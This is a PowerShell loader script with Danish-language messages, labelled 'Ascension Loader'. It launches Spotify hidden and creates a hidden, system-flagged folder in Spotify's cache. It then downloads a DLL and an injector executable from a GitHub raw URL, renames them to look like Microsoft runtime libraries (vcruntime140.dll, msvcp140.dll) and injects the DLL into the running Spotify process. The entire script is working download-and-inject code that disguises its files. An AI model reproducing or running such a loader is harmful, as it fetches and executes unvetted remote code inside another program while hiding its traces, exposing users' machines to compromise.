Write-Host "[*] Ascension Loader v2.3 - Klar til test" -ForegroundColor Cyan

$spotifyPath = "$env:APPDATA\Spotify\Spotify.exe"
if (-Not (Test-Path $spotifyPath)) {
    Write-Host "[!] Spotify ikke fundet! Installer Spotify først." -ForegroundColor Red
    pause; exit
}

if (-Not (Get-Process -Name "Spotify" -ErrorAction SilentlyContinue)) {
    Write-Host "[*] Starter Spotify..." -ForegroundColor Yellow
    Start-Process $spotifyPath -WindowStyle Hidden
    Start-Sleep -Seconds 7
}

$loaderDir = "$env:LOCALAPPDATA\Spotify\Users\Cache\Ascension"
New-Item -ItemType Directory -Force -Path $loaderDir | Out-Null
attrib +h +s $loaderDir

$baseUrl = "https://raw.githubusercontent.com/protocolDK/protocolDKloader/main"

Write-Host "[*] Downloader filer..." -ForegroundColor Yellow

Invoke-WebRequest -Uri "$baseUrl/files/loader.dll" -OutFile "$loaderDir\vcruntime140.dll"
Invoke-WebRequest -Uri "$baseUrl/files/injector.exe" -OutFile "$loaderDir\msvcp140.dll"

Write-Host "[+] Filer downloadet" -ForegroundColor Green

$spotifyPID = (Get-Process -Name "Spotify" | Select-Object -First 1).Id
Write-Host "[+] Injecter i Spotify (PID: $spotifyPID)..." -ForegroundColor Yellow

$injector = "$loaderDir\msvcp140.dll"
$payload  = "$loaderDir\vcruntime140.dll"

Start-Process -FilePath $injector -ArgumentList "$spotifyPID `"$payload`"" -NoNewWindow -Wait

Write-Host "[+] Injection færdig!" -ForegroundColor Green
Write-Host "[*] Tjek om Ascension vinduet dukker op..." -ForegroundColor Cyan
pause
